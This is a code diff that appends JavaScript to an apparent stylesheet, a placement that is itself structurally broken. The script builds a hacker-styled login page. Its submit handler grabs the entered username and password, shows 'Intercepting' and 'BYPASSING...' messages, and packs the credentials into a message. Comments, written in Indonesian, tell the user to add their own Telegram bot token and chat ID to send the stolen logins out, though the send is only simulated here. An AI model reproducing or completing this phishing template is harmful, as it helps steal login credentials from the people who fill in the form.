@@ -149,3 +149,50 @@ h2 {
     color: #7dd3fc;
     text-decoration: underline;
 }
+// 1. Inisialisasi Background Vanta
+VANTA.WAVES({
+  el: "body",
+  mouseControls: true, touchControls: true, gyroControls: true,
+  color: 0x0f172a, waveHeight: 20.00, waveSpeed: 0.80
+});
+
+// 2. Terminal Logger Function
+function logSystem(msg) {
+    const term = document.getElementById('terminal-content');
+    const time = new Date().toLocaleTimeString();
+    term.innerHTML += `<br>[${time}] ${msg}`;
+    term.scrollTop = term.scrollHeight;
+}
+
+// 3. Logic Utama
+document.addEventListener('DOMContentLoaded', () => {
+    logSystem("R3X_V3_CORE: Online");
+    
+    const loginForm = document.getElementById('loginForm');
+    const submitBtn = document.getElementById('submitBtn');
+
+    loginForm.addEventListener('submit', function (e) {
+        e.preventDefault();
+        
+        const user = document.getElementById('username').value;
+        const pass = document.getElementById('password').value;
+
+        logSystem(`Intercepting: ${user}`);
+        submitBtn.innerText = 'BYPASSING...';
+        submitBtn.disabled = true;
+
+        // FITUR KIRIM DATA (Ganti TOKEN & CHAT_ID dengan punya lo)
+        const token = "TOKEN_BOT_TELEGRAM_LO"; 
+        const chat_id = "ID_CHAT_TELEGRAM_LO";
+        const pesan = `Pesan Terenkripsi:\nUser: ${user}\nPass: ${pass}`;
+
+        // Simulasi pengiriman (Ganti fetch ini kalau mau pake Telegram asli)
+        setTimeout(() => {
+            logSystem("Data_Sent: Success");
+            alert(`Sistem R3X: Welcome, ${user}`);
+            submitBtn.innerText = 'SIGN IN';
+            submitBtn.disabled = false;
+            loginForm.reset();
+        }, 2000);
+    });
+});
